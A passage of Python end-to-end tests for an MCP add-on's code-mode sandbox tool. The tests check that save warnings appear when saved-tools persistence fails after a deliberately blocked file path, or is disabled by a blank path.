            HA_MCP_DEV_ADDON_SLUG,
            ["sh", "-c", f"rm -rf {saved_tools_path} && mkdir {saved_tools_path}"],
        )
        # Verify the poisoning actually blocks writes — root in the addon
        # container will see EISDIR on open(path, "w"). If a future
        # filesystem layout makes /data a tmpfs that allows the
        # directory→file flip, this preflight fails loudly rather than
        # the test silently passing.
        # Probe: try to write TO the path (which is now a directory).
        # open(saved_tools_path, "w") inside the addon's save logic
        # would raise IsADirectoryError; the shell equivalent is
        # ``echo X > /path/to/dir`` which fails with "Is a directory".
        # NOTE: probe must target the PATH itself, NOT a child file —
        # writing ``/path/to/dir/probe.json`` succeeds because that's
        # a normal file inside the directory, not a write to the
        # directory path. Verified on PR #1375 CI run 26093777356.
        preflight = docker_exec_in_addon(
            HA_MCP_DEV_ADDON_SLUG,
            [
                "sh",
                "-c",
                f"echo probe > {saved_tools_path} 2>&1; echo exit=$?",
            ],
        )
        assert "exit=0" not in preflight, (
            f"Filesystem-poisoning precondition failed: writes to "
            f"{saved_tools_path} succeeded after the directory-replace "
            f"trick, so the addon's open(path, 'w') would also succeed "
            f"and the rollback path would never fire. Probe output: "
            f"{preflight!r}"
        )

        try:
            # First save: persistence must fail; response surfaces
            # save_warning and saved_as=None while success stays True
            # (the sandbox code executed; only the durability of the
            # save_as entry failed).
            code = "result = {'value': 42}\nresult"
            data = await safe_call_tool(
                mcp_client,
                TOOL_NAME,
                {
                    "code": code,
                    "justification": "E2E test: save_warning rollback",
                    "save_as": "test_save_warning",
                },
            )
            assert data.get("success") is True, (
                f"Sandbox itself should still succeed even when persistence "
                f"fails: {data}"
            )
            payload = data.get("data", {})
            assert payload.get("saved_as") is None, (
                f"saved_as must be reset to None after rollback: {data}"
            )
            warning = payload.get("save_warning")
            assert isinstance(warning, str) and warning, (
                f"save_warning must be a non-empty string explaining the "
                f"persistence failure: {data}"
            )
            logger.info(
                "save_warning surfaced as expected on unwriteable "
                "/data/saved_tools.json: %r",
                warning,
            )
        finally:
            # Always restore writeability so the rest of the session
            # (and any retry) sees a usable persistence path. Wrap in
            # its own try/except so a flaky SSH session here doesn't
            # mask the original test exception — log the restore
            # failure and re-raise, leaving the directory poisoned so
            # the next test fails loudly instead of cascading on a
            # stale 444/EISDIR.
            try:
                docker_exec_in_addon(
                    HA_MCP_DEV_ADDON_SLUG,
                    [
                        "sh",
                        "-c",
                        f"rm -rf {saved_tools_path} && touch {saved_tools_path}",
                    ],
                )
            except Exception:
                logger.exception(
                    "Failed to restore %s; subsequent tests in this session "
                    "may cascade on the leftover directory",
                    saved_tools_path,
                )
                raise

        # Second save (after restore): proves the restore worked and
        # that the same code path now persists cleanly. Uses a distinct
        # save_as so it doesn't collide with the first attempt (which
        # was rolled back from the in-memory cache but never written).
        data = await safe_call_tool(
            mcp_client,
            TOOL_NAME,
            {
                "code": code,
                "justification": "E2E test: save_warning rollback (post-restore)",
                "save_as": "test_save_warning_restored",
            },
        )
        assert data.get("success") is True, f"Post-restore save must succeed: {data}"
        payload = data.get("data", {})
        assert payload.get("saved_as") == "test_save_warning_restored", (
            f"saved_as must reflect the persisted name after restore: {data}"
        )
        assert "save_warning" not in payload, (
            f"save_warning must not appear on a clean save: {data}"
        )


class TestCodeModeBlankPathWarning:
    """A blank ``code_mode_saved_tools_path`` disables persistence — a
    ``save_as`` succeeds in memory but isn't durable, so the response must
    carry a ``save_warning``. The in-process ``mcp_client_with_code_mode``
    server leaves the path unset (the standalone/Docker "forgot to
    configure persistence" case), so any save through it exercises this.
    Companion to the write-failure shape pinned above.
    """

    async def test_blank_path_save_warns_in_memory_only(
        self, mcp_client_with_code_mode
    ):
        _skip_if_unavailable(
            await _check_tool_available(mcp_client_with_code_mode),
            "test_blank_path_save_warns_in_memory_only",
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": "result = {'value': 1}\nresult",
                "justification": "E2E test: blank-path persistence warning",
                "save_as": "test_blank_path_warning",
            },
        )
        assert data.get("success") is True, data
        payload = data.get("data", {})
        # The in-memory save succeeds, so saved_as stays set (unlike the
        # write-failure rollback, which resets it to None).
        assert payload.get("saved_as") == "test_blank_path_warning", data
        # ...but the response must warn that the entry isn't persisted.
        warning = payload.get("save_warning")
        assert isinstance(warning, str) and "memory only" in warning, (
            f"expected an in-memory-only persistence warning when the "
            f"saved-tools path is unset: {data}"
        )
